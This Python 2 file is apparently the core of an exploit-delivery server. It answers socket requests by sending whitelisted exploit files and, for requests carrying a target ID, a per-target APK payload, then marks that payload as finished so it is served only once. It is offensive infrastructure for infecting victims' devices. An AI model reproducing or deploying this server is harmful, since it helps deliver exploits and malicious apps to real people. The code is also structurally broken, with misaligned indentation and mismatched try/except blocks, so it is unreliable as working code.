import socket
import string
import os
import sys
import logging
import time
import re

# Download protocol:
# get![file_name]
# file_name have to be inside the whitelist

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)


def start_exp_server(s):

	logging.info('Starting exploit server')
       
        # Files whitelist (exploits)
        wl = ["le8s98", "gi21flm", "st21k", "e72uds", "g1ml329py"]
	
	# apk message is "rz87l"


        # Message handling
        while True: 
            data = s.recv(1025)
            if len(data) == 0:
                s.close()
                logging.info('Connection closed..')
                return
            
            # Parse received request
            cmd = data.split('!')

            if cmd[0] == 'get':
                try:
                    dw_file = cmd[1].strip()
                    logging.info('Received get for {}'.format(dw_file))
                    
                    # Whitelist check
                    if(dw_file in wl):
                        s.sendall(str(os.path.getsize(dw_file)))
                        with open(dw_file, 'rb') as f:
                            data = s.recv(1025)
                            if(data.strip() == "ready"):
				    time.sleep(2)
				    logging.info('Sending file {}..'.format(dw_file))
				    data = f.read()
				    s.sendall(data)

		    # 'news_0123456789_%s'
		    elif re.match('news_(\d{10})_', dw_file) != None:

			    # dupe code, not that dice
			    match = re.match('news_(\d{10})_', dw_file)
			    exploit_id = match.group(1)

			    apk_path = '{}/{}_apk'.format(exploit_id, exploit_id)
			    
			    if os.path.isfile(apk_path):
				    s.sendall(str(os.path.getsize(apk_path)))
				    with open(apk_path, 'rb') as f:
					    data = s.recv(1025)
					    if(data.strip() == "ready"):
						    time.sleep(2)
						    logging.info('Sending file {}..'.format(apk_path))
						    data = f.read()
						    s.sendall(data)
			    
			    

				    # once the apk has been sent, update setup.txt status for this instance,
				    # thus we avoid serving the exploit any further
				    setup = open('{}/setup.txt'.format(exploit_id), 'r+')
				    setup.write('status:finished')
				    setup.close()


                except Exception as e:
			print e
			logging.debug('Something wrong handling get message... skipping')
			return

	    
		except socket.error as e:
			logging.info('Exploit server socket error {}'.format(e))
